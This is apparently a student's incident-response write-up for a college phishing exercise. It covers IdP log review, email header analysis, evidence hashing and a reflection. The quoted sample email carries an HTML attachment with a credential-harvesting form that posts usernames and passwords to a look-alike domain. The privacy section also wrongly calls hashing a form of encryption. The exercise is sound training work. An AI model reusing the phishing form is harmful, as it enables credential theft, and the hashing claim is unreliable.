# My First-Hour Priorities
- Capture relevant information on access attempts, this can help us ascertain if repeated access attempts are malicious or accidental.
- Include times and IP addresses. These are good for building a narrative when documenting cases. 
- Capture devices and where they are accessing from, again this will help with figuring out intent. Having locations of device access can be helpful but may be reaching out of scope.
- Avoid capturing all information, just the minimum required as to not cross ethical and legal boundaries. 
- Capture relevant emails, looking at SPF, DKIM, and DMARCs along with the Message-ID. This helps when documenting information related to a case, especially in phishing or malicious email incidents.


# Incident & Evidence Notes 
- Incident HC-IR-1066

- 2025-09-11T13:45:00Z – Initial incident declared: Christian/Cybersecurity Analyst that was notified that an unauthenticated email was received by student Sam Rivera. Ticket was created with HC-IR-1066

- John Smith/Incident manager approved inspections of IdP logs and examine suspicious email under minimum-necessary evidence collection for +-15 minutes

- IdP logs examined for “sam.rivera”, multiple login attempts failed between two IP addresses: 203.0.113.88 and 203.0.113.175. MFA push failed along with password failed with unfamiliar sign in properties. The final attempt was successful @2025-09-11T13:14:03Z, account likely compromised. .eml file provided shows email failed SPF, DMARC, and DKIM resulted in a none. Attacker likely spoofing from 20250911.130738.ab12@smtp01.lowcost-mail.example as donotreply@blackboard.com. Linked registration was likely clicked by the student, allowing attacker access to the account. This is likely a mass phishing attempt. IdP logs show attempts from cloud VM, which lends credence to mass phishing attempts. 

- Evidence capture @ 2025-09-11T13:45:00Z under Week4_Phishing_Assignment_IdP_logs.csv – SHA-256: c52df5aa4ff5507ecf844a98edd42309d4266f41747bd09264b79f6047320769 and Week4_Phising_Assignment_Email.eml – SHA-256:b2e70976a832a7a5c1ef979042a3cdac4cbea710dbcd0e69eb405f2d258c2346These are useful documents showing the attacker attempts along versus sam.rivera logging in earlier, the .eml file shows how the phishing attack was spoofed to gain access. 

- Data is stored on the school server drive, accessed by Christian Ellefson and John Smith at 2025-09-11T13:45:00Z; transfer record kept.

- Redacted information would include student email, IP address, laptop name, and student name. Attacker IP addresses and approaches should be stored as future flags. 

- Risk evaluation: High, account should immediately be locked and laptop should be isolated from network until device is determined to be cleaned. Blackboard accounts and student email require new login credentials and password in conjunction with a new MFA. Potential computer wipe required but will be determined at a later date. Handoff to cybersecurity recovery team. 

**These notes are in response to an IdP for the in-class activity along with the Original Message for the example scam email, listed below:**


[UplReturn-Path: <donotreply@blackboard-mail.center>
Received: from mx1.hocking.example (10.12.34.20)
  by mailhub.hocking.example with ESMTP id 7B9E8A113
  for <sam.rivera@hocking.example>; Thu, 11 Sep 2025 13:07:43 +0000 (UTC)
Received: from smtp01.lowcost-mail.example (192.0.2.66)
  by mx1.hocking.example with ESMTPS id 7B9E8A112; Thu, 11 Sep 2025 13:07:43 +0000
Authentication-Results: mx1.hocking.example;
  spf=softfail smtp.mailfrom=donotreply@blackboard-mail.center;
  dkim=none;
  dmarc=fail (p=none) header.from=blackboard.com
From: "Blackboard Learn" <donotreply@blackboard.com>
Reply-To: "Events" <events@blackboard-mail.center>
To: Sam Rivera <sam.rivera@hocking.example>
Subject: one-hour prof dev webinar – registration file attached
Date: Thu, 11 Sep 2025 13:07:38 +0000
Message-ID: <20250911.130738.ab12@smtp01.lowcost-mail.example>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="bnd"

--bnd
Content-Type: text/plain; charset=UTF-8

Open the attached registration and confirm today.
--bnd
Content-Type: text/html; name="Registration.pdf.html"
Content-Disposition: attachment; filename="Registration.pdf.html"

<html><body><form method="POST" action="https://cdn-blackboard-mail.center/submit">
  <p>Sign in to complete registration</p>
  <input type="text" name="username"/>
  <input type="password" name="password"/>
  <input type="submit" value="Continue"/>
</form></body></html>
--bnd--
loading Week4_Phising_Assignment_Email.eml…]()

**IdP Logs Listed below for access attempt information**:

[IdP Logs.PDF](https://github.com/user-attachments/files/22316151/IdP.Logs.PDF)

**Activity Prompt:**

You are working in cybersecurity at Hocking College. An automated alert was triggered when an unauthenticated email message was delivered to student Sam Rivera. Standard procedure, per institutional policy, is to inspect IdP logs and examine the suspicious email under minimum-necessary evidence collection. The incident manager [John Smith] created a work ticket HC-IR-1066 at 2025-09-11T13:45:00Z and authorized inspections +-15 minutes from the time the suspicious email was received.



# Integrity & Privacy Controls 
Information gathered during an investigation should be encrypted with a strong hash, recommended SHA256 or higher, in order to safeguard PII, company information, and other sensitive data. Information should be stored on a secure server, with highly sensitive information being stored on an air gapped server or in a physically locked away copy. Redaction is important while also keeping an original, unedited copy. The redacted file should have all PII removed as to not be able to figure out who the employee is. 

# Evidence Links
[CYBR 2100 In-class activity Week 4.pdf](https://github.com/user-attachments/files/22316218/CYBR.2100.In-class.activity.Week.4.pdf)

[CYBR2100_Reflection_W04_EllefsonChristian.pdf](https://github.com/user-attachments/files/22316226/CYBR2100_Reflection_W04_EllefsonChristian.pdf)

# Reflection

There will likely always be trade-offs when it comes to collecting too much/too little data and the security methods we use. Collecting too much data can often lead to scope creep, where people will reach far beyond what is needed to accomplish an investigation and reach a verdict for a plan of action and recovery method. Collecting too little can lead to an inaccurate assessment, potentially not fixing the root issue and allowing for entire networks to be taken down or worse. Next time I will look at another approach with hopefully more experience to make what could be a potentially better decision if this wasn’t the exact correct response.
